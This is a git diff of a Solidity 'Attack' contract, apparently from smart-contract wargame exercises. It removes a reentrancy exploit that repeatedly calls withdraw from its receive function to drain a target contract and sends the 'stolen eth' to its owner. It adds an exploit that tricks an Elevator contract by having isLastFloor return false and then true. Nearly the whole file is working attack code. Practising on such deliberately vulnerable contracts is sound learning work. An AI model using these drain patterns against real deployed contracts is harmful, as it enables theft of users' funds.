@@ -1,39 +1,25 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.12;
+pragma solidity ^0.8.0;
 
-import "./Reentrance.sol";
-import "hardhat/console.sol";
+import "./Elevator.sol";
 
 contract Attack {
-    Reentrance public reentranceContract;
-    address public owner;
+    Elevator public elevatorContract;
+    bool toggle; // initial value is false
 
-    constructor(address payable _reentranceContract) public {
-        reentranceContract = Reentrance(_reentranceContract);
-        owner = msg.sender;
+    constructor(address _elevatorContracts) {
+        elevatorContract = Elevator(_elevatorContracts);
     }
 
-    function attack() public payable {
-        reentranceContract.donate{value: msg.value}(address(this));
-        reentranceContract.withdraw(1e14);
+    function isLastFloor(uint) external returns (bool) {
+        if (!toggle) {
+            toggle = true;
+            return false;
+        }
+        return true;
     }
 
-    receive() external payable {
-        console.log("performing reenrancy attack");
-        if (address(reentranceContract).balance > 0) {
-            console.log(
-                "The balance is now %s",
-                address(reentranceContract).balance
-            );
-            reentranceContract.withdraw(1e14);
-        }
-
-        uint currentBalance = address(this).balance;
-        // This was made to successfuly reclaim our stolen eth
-        (bool success, ) = owner.call{value: address(this).balance}(""); // transfers stolen money to the owner of the contract
-
-        if (success) {
-            console.log("Successfully sent %s to %s", currentBalance, owner);
-        }
+    function initiateAttack() public {
+        elevatorContract.goTo(5);
     }
 }
